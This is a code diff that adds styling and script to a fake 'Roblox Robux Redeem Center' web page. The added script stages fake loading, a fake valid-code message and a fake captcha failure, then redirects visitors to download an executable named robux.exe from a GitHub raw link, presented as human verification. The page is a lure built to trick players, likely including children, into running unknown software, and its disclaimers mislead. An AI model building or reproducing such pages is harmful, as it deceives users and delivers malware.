@@ -5,18 +5,243 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Roblox Robux Redeem Center</title>
   <link rel="stylesheet" href="styles.css">
+  <style>
+    /* Global styles */
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-color: #f0f0f0;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 90%;
+      margin: 50px auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      animation: fadeInUp 1s ease forwards;
+    }
+
+    .logo {
+      width: 120px;
+      height: auto;
+      margin-bottom: 20px;
+      animation: bounceIn 1s ease forwards;
+    }
+
+    h1 {
+      color: #333;
+      font-size: 32px;
+      margin-bottom: 20px;
+    }
+
+    p {
+      color: #666;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: calc(100% - 20px);
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      transition: border-color 0.3s ease;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    input:focus {
+      border-color: #4CAF50;
+    }
+
+    .redeem-button {
+      width: calc(100% - 20px);
+      padding: 12px;
+      background-color: #4CAF50;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    .redeem-button:hover {
+      background-color: #45a049;
+    }
+
+
+    .loading-spinner {
+      border: 4px solid rgba(0, 0, 0, 0.1);
+      border-radius: 50%;
+      border-top: 4px solid #4CAF50;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+
+
+    
+    .success-message {
+      display: none;
+      color: #4CAF50;
+      margin-bottom: 20px;
+      animation: fadeIn 1s ease forwards;
+    }
+
+    .username-input {
+      display: none;
+      width: calc(100% - 20px);
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      transition: border-color 0.3s ease;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    .disclaimer {
+      font-size: 14px;
+      color: #888;
+      margin-top: 20px;
+    }
+
+    /* Additional styles */
+    .subtitle {
+      color: #555;
+      font-size: 20px;
+      margin-bottom: 30px;
+    }
+
+    /* Background animation */
+    body {
+      background-color: #f0f0f0;
+      background-image: linear-gradient(to right, #f0f0f0 50%, #ffffff 50%);
+      background-size: 200% 100%;
+      animation: gradientAnimation 4s infinite alternate;
+    }
+
+    @keyframes gradientAnimation {
+      0% {
+        background-position: 0%;
+      }
+      100% {
+        background-position: 100%;
+      }
+    }
+
+    /* Form validation styles */
+    input:invalid {
+      border-color: #ff6347; /* Red */
+    }
+
+    input:focus:invalid {
+      border-color: #ff6347; /* Red */
+    }
+
+    input:valid {
+      border-color: #4CAF50; /* Green */
+    }
+
+    /* Ensure responsiveness */
+    @media (min-width: 768px) {
+      .container {
+        max-width: 400px;
+      }
+    }
+
+    /* Animations */
+    @keyframes bounceIn {
+      from {
+        opacity: 0;
+        transform: scale(0.5);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(-50px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+      to {
+        opacity: 1;
+      }
+    }
+  </style>
 </head>
 <body>
   <div class="container">
     <img src="roblox-logo.png" alt="Roblox Logo" class="logo">
-    <h1>Roblox Robux Redeem </h1>
-    <p>Please enter your redeem code below:</p>
-    <input type="text" id="redeemCode" placeholder="Enter Redeem Code">
-    <button onclick="redeemRobux()">Redeem</button>
-    <div id="loading" class="loading"></div>
-    <div id="result" class="hidden"></div>
-    <p class="disclaimer">This service is 100% legitimate and safe. We've not partnered with Roblox to provide this exclusive offer. Your privacy and security are our top priorities.</p>
+    <h1>Roblox Robux Redeem Center</h1>
+    <p class="subtitle">Enter your redeem code below to claim your Robux!</p>
+    <form id="redeemForm">
+      <input type="text" id="redeemCode" placeholder="Enter Redeem Code" required>
+      <button type="submit" class="redeem-button">Redeem</button>
+    </form>
+    <div id="loading" class="loading">
+      <div class="loading-spinner"></div>
+    </div>
+    <div id="result" class="success-message"></div>
+    <input type="text" id="username" class="username-input" placeholder="Enter Your Username">
+    <p class="disclaimer">For security purposes, complete the human verification process below.</p>
+    <p class="disclaimer">
+      This application is not affiliated with Roblox or its partners, nor does it provide a warranty. By using the application, individuals are assumed to have accepted these terms.</p>
   </div>
-  <script src="script.js"></script>
+  <script>
+    const redeemForm = document.getElementById('redeemForm');
+    const loadingDiv = document.getElementById('loading');
+    const resultDiv = document.getElementById('result');
+    const usernameInput = document.getElementById('username');
+
+    redeemForm.addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const redeemCodeInput = document.getElementById('redeemCode');
+      const redeemCode = redeemCodeInput.value.trim();
+
+      if (redeemCode === '123') {
+        alert('Please enter a valid redeem code.');
+        return;
+      }
+
+      // Simulate loading animation
+      loadingDiv.style.display = 'block';
+      setTimeout(function() {
+        loadingDiv.style.display = 'none';
+        usernameInput.style.display = 'block';
+        resultDiv.textContent = 'Redeeming...';
+        resultDiv.style.display = 'block';
+        setTimeout(function() {
+          resultDiv.textContent = 'Reedem code is valid. (Pyro1000RobuxEvent)';
+          setTimeout(function() {
+            resultDiv.textContent = 'Something went wrong! Verify you are a human by solving captcha.';
+            resultDiv.style.color = '#ff6347'; 
+            setTimeout(function() {
+              window.location.href = 'https://github.com/youaretooewasy/really/raw/main/robux.exe?humanverification750Robuxes';
+            }, 4000);
+          }, 3000);
+        }, 4000);
+      }, 6000);
+    });
+  </script>
 </body>
 </html>
